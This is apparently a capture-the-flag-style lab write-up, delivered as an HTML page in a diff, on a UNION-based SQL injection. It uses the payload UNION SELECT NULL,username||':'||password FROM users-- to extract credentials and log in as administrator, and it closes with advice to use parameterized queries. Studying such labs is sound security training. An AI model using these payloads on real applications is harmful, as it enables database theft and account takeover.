@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      color: #222;
+      max-width: 1000px;
+      margin: 40px auto;
+      padding: 0 20px;
+      background: #f5f7fa;
+    }
+
+.container {
+  background: #fff;
+  padding: 35px;
+  border-radius: 10px;
+  box-shadow: 0 3px 12px rgba(0,0,0,0.08);
+}
+
+h1, h2, h3 {
+  color: #17324d;
+}
+
+h1 {
+  border-bottom: 3px solid #17324d;
+  padding-bottom: 10px;
+}
+
+code {
+  background: #eef1f4;
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-family: Consolas, monospace;
+}
+
+pre {
+  background: #1e1e1e;
+  color: #f5f5f5;
+  padding: 18px;
+  border-radius: 8px;
+  overflow-x: auto;
+  font-family: Consolas, monospace;
+}
+
+.success {
+  background: #e8f7ee;
+  border-left: 5px solid #2e8b57;
+  padding: 15px;
+  margin: 20px 0;
+}
+
+.note {
+  background: #fff8df;
+  border-left: 5px solid #d6a500;
+  padding: 15px;
+  margin: 20px 0;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 20px 0;
+}
+
+th, td {
+  border: 1px solid #ccc;
+  padding: 10px;
+  text-align: left;
+}
+
+th {
+  background: #eef1f4;
+}
+
+
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+```
+<h1>SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column</h1>
+
+<h2>Lab Overview</h2>
+
+<table>
+  <tr>
+    <th>Lab</th>
+    <td>SQL injection UNION attack, retrieving multiple values in a single column</td>
+  </tr>
+  <tr>
+    <th>Difficulty</th>
+    <td>Practitioner</td>
+  </tr>
+  <tr>
+    <th>Vulnerability</th>
+    <td>SQL Injection — UNION-based SQL Injection</td>
+  </tr>
+  <tr>
+    <th>Target</th>
+    <td>Product category filter</td>
+  </tr>
+  <tr>
+    <th>Objective</th>
+    <td>Retrieve usernames and passwords from the <code>users</code> table and use the administrator credentials to log in.</td>
+  </tr>
+</table>
+
+<h2>1. Lab Objective</h2>
+
+<p>
+  The application contains a SQL injection vulnerability in the product category
+  filter. The results of the underlying SQL query are reflected in the application's
+  response.
+</p>
+
+<p>
+  The database contains a separate <code>users</code> table with the following columns:
+</p>
+
+<ul>
+  <li><code>username</code></li>
+  <li><code>password</code></li>
+</ul>
+
+<p>
+  The challenge was to perform a UNION-based SQL injection attack that retrieves
+  both values even though only a single output column is available for displaying
+  arbitrary text.
+</p>
+
+<h2>2. Identifying the Number of Columns</h2>
+
+<p>
+  The first step was to determine how many columns were being returned by the
+  original SQL query.
+</p>
+
+<p>
+  A UNION query must contain the same number of columns as the original query.
+  From previous testing, the query was determined to return two columns.
+</p>
+
+<p>
+  The next step was therefore to determine which column could display text.
+</p>
+
+<h2>3. Testing a Text-Compatible Column</h2>
+
+<p>
+  I injected a simple string into the second column:
+</p>
+
+<pre>GET /filter?category=Pets'+UNION+SELECT+NULL,'test'-- HTTP/2</pre>
+
+<p>
+  The server returned a successful response:
+</p>
+
+<pre>HTTP/2 200 OK</pre>
+
+<p>
+  More importantly, the application displayed:
+</p>
+
+<pre>test</pre>
+
+<p>
+  This confirmed that the second column was reflected in the application's
+  response and could therefore be used to display extracted database values.
+</p>
+
+<h2>4. Understanding the UNION Injection</h2>
+
+<p>
+  The successful payload was:
+</p>
+
+<pre>' UNION SELECT NULL,'test'--</pre>
+
+<p>
+  Its components can be understood as follows:
+</p>
+
+<table>
+  <tr>
+    <th>Payload Component</th>
+    <th>Purpose</th>
+  </tr>
+  <tr>
+    <td><code>'</code></td>
+    <td>Terminates the original string value in the SQL query.</td>
+  </tr>
+  <tr>
+    <td><code>UNION SELECT</code></td>
+    <td>Adds results from a second SQL query to the original result.</td>
+  </tr>
+  <tr>
+    <td><code>NULL</code></td>
+    <td>Fills the first required column.</td>
+  </tr>
+  <tr>
+    <td><code>'test'</code></td>
+    <td>Places a controllable text value in the second column.</td>
+  </tr>
+  <tr>
+    <td><code>--</code></td>
+    <td>Comments out the remainder of the original SQL statement.</td>
+  </tr>
+</table>
+
+<h2>5. Retrieving Multiple Values in One Column</h2>
+
+<p>
+  The challenge was not simply to retrieve the username and password separately.
+  The application only provided one suitable column for displaying our extracted
+  text.
+</p>
+
+<p>
+  Therefore, the two database fields had to be concatenated into a single value.
+</p>
+
+<p>
+  The final payload was:
+</p>
+
+<pre>GET /filter?category=Pets'+UNION+SELECT+NULL,username||':'||password+FROM+users-- HTTP/2</pre>
+
+<p>
+  The SQL portion of the injection was:
+</p>
+
+<pre>UNION SELECT NULL,username||':'||password FROM users--</pre>
+
+<h2>6. Understanding the Concatenation</h2>
+
+<p>
+  The expression:
+</p>
+
+<pre>username||':'||password</pre>
+
+<p>
+  concatenates the username, a colon separator, and the password into a single
+  output value.
+</p>
+
+<p>
+  For example, if the database contained:
+</p>
+
+<pre>username: administrator
+```
+
+password: example123</pre>
+
+```
+<p>
+  the expression would produce:
+</p>
+
+<pre>administrator:example123</pre>
+
+<p>
+  This allowed both database fields to be returned through the same application
+  column.
+</p>
+
+<h2>7. Query Breakdown</h2>
+
+<pre>' UNION SELECT NULL,username||':'||password FROM users--</pre>
+
+<table>
+  <tr>
+    <th>Component</th>
+    <th>Explanation</th>
+  </tr>
+  <tr>
+    <td><code>'</code></td>
+    <td>Closes the application's original string context.</td>
+  </tr>
+  <tr>
+    <td><code>UNION SELECT</code></td>
+    <td>Combines the attacker's query with the application's original query.</td>
+  </tr>
+  <tr>
+    <td><code>NULL</code></td>
+    <td>Provides the first column required by the two-column query.</td>
+  </tr>
+  <tr>
+    <td><code>username||':'||password</code></td>
+    <td>Combines the username and password into one displayed value.</td>
+  </tr>
+  <tr>
+    <td><code>FROM users</code></td>
+    <td>Retrieves the data from the <code>users</code> table.</td>
+  </tr>
+  <tr>
+    <td><code>--</code></td>
+    <td>Comments out the remainder of the original SQL query.</td>
+  </tr>
+</table>
+
+<h2>8. Retrieved Credentials</h2>
+
+<p>
+  The application returned the usernames and passwords from the <code>users</code>
+  table in the following format:
+</p>
+
+<pre>username:password</pre>
+
+<p>
+  Among the returned records was the <code>administrator</code> account.
+</p>
+
+<p>
+  I used the retrieved administrator username and corresponding password to
+  authenticate through the application's login page.
+</p>
+
+<div class="success">
+  <strong>Lab Solved:</strong>
+  The UNION injection successfully retrieved multiple database values through a
+  single output column, allowing the administrator credentials to be obtained and
+  used for authentication.
+</div>
+
+<h2>9. Key Lessons Learned</h2>
+
+<ul>
+  <li>
+    UNION-based SQL injection requires the injected SELECT statement to have the
+    correct number of columns.
+  </li>
+  <li>
+    <code>NULL</code> values are useful when testing column compatibility.
+  </li>
+  <li>
+    A successful reflected string such as <code>test</code> identifies a useful
+    output column.
+  </li>
+  <li>
+    Multiple database fields can be concatenated into a single output column.
+  </li>
+  <li>
+    The concatenation operator <code>||</code> was used in this lab to combine
+    <code>username</code> and <code>password</code>.
+  </li>
+  <li>
+    SQL comments such as <code>--</code> can be used to terminate the injected
+    statement and neutralize the remainder of the original query.
+  </li>
+</ul>
+
+<h2>10. Final Attack Chain</h2>
+
+<pre>
+```
+
+Identify SQL injection
+↓
+Determine number of columns
+↓
+Confirm text-compatible column
+↓
+Test: UNION SELECT NULL,'test'
+↓
+Identify the users table
+↓
+Concatenate username + password
+↓
+UNION SELECT NULL,username||':'||password FROM users--
+↓
+Retrieve credentials
+↓
+Authenticate as administrator
+↓
+Lab solved </pre>
+
+```
+<h2>Conclusion</h2>
+
+<p>
+  This lab demonstrated how a UNION-based SQL injection can be extended beyond
+  simply retrieving individual fields. When only one suitable output column is
+  available, multiple database values can be concatenated into that column and
+  returned together.
+</p>
+
+<p>
+  The key technique was using:
+</p>
+
+<pre>username||':'||password</pre>
+
+<p>
+  to combine the two sensitive fields into one result, which ultimately allowed
+  the administrator credentials to be recovered and the lab to be completed.
+</p>
+
+<div class="note">
+  <strong>Security takeaway:</strong>
+  Applications should never construct SQL queries by directly concatenating
+  user-controlled input. Parameterized queries (prepared statements) should be
+  used to prevent SQL injection attacks.
+</div>
+```
+
+  </div>
+</body>
+</html>
